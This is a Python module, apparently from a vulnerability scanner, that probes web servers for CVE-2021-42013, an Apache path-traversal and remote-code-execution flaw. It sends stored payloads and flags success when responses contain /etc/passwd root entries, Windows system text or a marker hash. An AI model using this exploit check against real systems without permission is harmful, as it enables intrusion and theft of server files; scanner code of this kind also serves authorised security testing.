#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import HackRequests
from time import sleep
import re
import socket

def cve_2021_42013_scan(self, url):
    ''' CVE-2021-42013是CVE-2021-41773的绕过, 使用.%%32%65/ '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE/FileRead'
    vul_info['vul_id'] = 'CVE-2021-42013'
    # vul_info['vul_method'] = 'GET/POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_42013_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            if data:
                method = 'POST'
            else:
                method = 'GET'

            hack = HackRequests.hackRequests()
            
            res = hack.http(
                target,
                method=method,
                data=data,
                timeout=self.timeout,
                headers=self.headers,
                proxy=self.proxy,
                location=False
            )

            res.method = method
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if ((self.md in check.check_res(res.text(), self.md))
                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text(), re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text()) 
                    and ('Microsoft TCP/IP for Windows' in res.text()))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except socket.timeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except ConnectionRefusedError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
